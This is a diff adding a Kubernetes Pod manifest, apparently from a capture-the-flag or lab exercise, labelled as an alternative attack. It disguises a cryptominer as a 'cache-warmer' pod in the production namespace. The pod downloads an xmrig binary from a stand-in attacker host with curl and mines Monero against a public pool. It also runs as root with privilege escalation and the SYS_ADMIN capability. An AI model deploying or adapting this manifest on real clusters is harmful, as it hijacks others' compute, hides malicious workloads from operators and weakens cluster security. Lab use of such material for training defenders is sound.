@@ -1,0 +1,51 @@
+# Alternative attack: Deploy a standalone malicious pod
+# This pod appears legitimate but contains a cryptominer
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cache-warmer
+  namespace: production
+  labels:
+    app: cache-warmer
+    component: infrastructure
+    # Looks legitimate!
+spec:
+  serviceAccountName: recipe-api-sa
+  containers:
+  - name: cache-warmer
+    image: alpine:latest
+    command: ["/bin/sh"]
+    args:
+      - -c
+      - |
+        # Install dependencies
+        apk add --no-cache curl bash
+
+        # Download "cache warming script" (actually a cryptominer)
+        curl -o /tmp/warmer http://attacker.ctf.local/xmrig
+        chmod +x /tmp/warmer
+
+        # Run the "cache warmer" (actually mining cryptocurrency)
+        /tmp/warmer \
+          --donate-level 1 \
+          -o pool.supportxmr.com:443 \
+          -u 48X... \
+          --tls \
+          --coin monero
+
+    resources:
+      requests:
+        memory: "2Gi"
+        cpu: "2000m"
+      limits:
+        memory: "4Gi"
+        cpu: "4000m"
+
+    securityContext:
+      runAsNonRoot: false
+      runAsUser: 0
+      allowPrivilegeEscalation: true
+      capabilities:
+        add:
+        - SYS_ADMIN
